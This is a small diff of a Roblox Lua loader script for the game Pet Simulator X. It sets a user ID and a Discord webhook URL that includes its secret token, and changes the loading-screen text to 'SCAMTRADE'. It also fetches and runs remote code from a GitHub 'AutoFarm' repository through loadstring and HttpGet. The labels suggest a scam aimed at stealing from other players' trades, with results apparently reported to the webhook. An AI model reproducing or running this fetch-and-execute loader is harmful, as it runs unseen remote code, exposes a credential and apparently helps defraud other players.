@@ -1,3 +1,4 @@
-_G.UserID = 880348340
+_G.UserID = "880348340" 
 _G.WebHook = "https://discord.com/api/webhooks/1061314605563002970/VEXogg1MyaL3j8HBFsMfKFOYa5chK-Lc-gBFJd48TsVDh5d-3Wi-d0mA4E93YkRgDcBp"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua%27))()
+_G.LoadingScreenText = "SCAMTRADE"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
